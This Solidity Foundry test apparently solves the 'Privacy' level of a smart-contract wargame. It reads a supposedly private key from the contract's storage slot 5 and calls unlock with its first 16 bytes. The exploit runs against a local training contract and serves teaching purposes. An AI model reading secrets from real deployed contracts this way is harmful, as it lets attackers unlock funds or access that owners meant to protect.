// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Test, console} from "forge-std/Test.sol";
import {Privacy} from "../src/contracts/12_Privacy.sol";

contract PrivacyTest is Test {
    Privacy private privacy;

    function setUp() public {
        bytes32[3] memory data = [
            bytes32(
                0x1111111111111111111111111111111111111111111111111111111111111111
            ),
            bytes32(
                0x2222222222222222222222222222222222222222222222222222222222222222
            ),
            bytes32(
                0x3333333333333333333333333333333333333333333333333333333333333333
            )
        ];
        privacy = new Privacy(data);
    }

    function test_PrivacyExploitVulnerability() public {
        // Beacuse the variables: flattening, denomination and awkwardness occupy storage space less than 256 bits are packed into a single one
        /*
        0:       0x0000000000000000000000000000000000000000000000000000000000000001 (1)
        1:       0x000000000000000000000000000000000000000000000000000000005ff64a80 (1609976448)
        2:       0x000000000000000000000000000000000000000000000000000000004a80ff0a (now=0x4a80, 255=0xff, 10=0xa)
        3:       0x1111111111111111111111111111111111111111111111111111111111111111 (data[0])
        4:       0x2222222222222222222222222222222222222222222222222222222222222222 (data[1])
        5:       0x3333333333333333333333333333333333333333333333333333333333333333 (data[2])
        6:       0x0000000000000000000000000000000000000000000000000000000000000000 (0)
        */
        bytes32 key = vm.load(address(privacy), bytes32(uint256(5)));

        console.logBytes32(key);
        privacy.unlock(bytes16(key));

        assertFalse(privacy.locked());
    }
}
